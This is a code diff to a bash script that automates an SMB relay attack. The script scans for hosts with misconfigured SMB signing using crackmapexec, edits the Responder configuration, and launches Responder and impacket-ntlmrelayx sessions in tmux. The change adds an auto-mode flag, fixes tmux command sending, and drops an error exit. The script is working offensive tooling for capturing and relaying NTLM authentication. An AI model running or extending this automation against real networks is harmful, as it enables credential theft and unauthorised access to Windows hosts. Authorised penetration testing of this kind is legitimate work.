@@ -12,6 +12,7 @@ responder_config_file="${RESPONDER_CONF:-/etc/responder/Responder.conf}"
 session_name="smb_relay_attack"
 TARGET_SMB_FILE="vulnerable_smb_targets.txt" 
 enable_interactive=false
+AUTO_MODE=false
 SESSION_CREATED=false
 
 RUN_ID=$(date +%s)
@@ -146,7 +147,8 @@ start_tmux_window() {
         tmux new-window -t "$session_name" -n "$window_name"
     fi
 
-    tmux send-keys -t "$session_name:$window_name" bash -c "$command"
+    tmux send-keys -t "$session_name:$window_name" "$command"
+    tmux send-keys -t "$session_name:$window_name" C-m
 }
 
 # Function to execute SMB relay attack in tmux
@@ -267,16 +269,13 @@ check_tool "responder"
 check_tool "impacket-ntlmrelayx"
 check_tool "crackmapexec"
 
-if ! run_crackmapexec; then
-    exit 1
-fi
+run_crackmapexec
 
 if [ -s "${TARGET_SMB_FILE}" ]; then
     log SUCCESS "${GREEN}[+] Vulnerable targets found. Proceeding with SMB relay attack...${RESET}"
     edit_responder_conf
     sleep 3
     run_smb_relay_attack
-    return 1
 else
     log ERROR "${RED}[!] No misconfigured SMB signing targets found. Exiting...${RESET}"
     exit 0
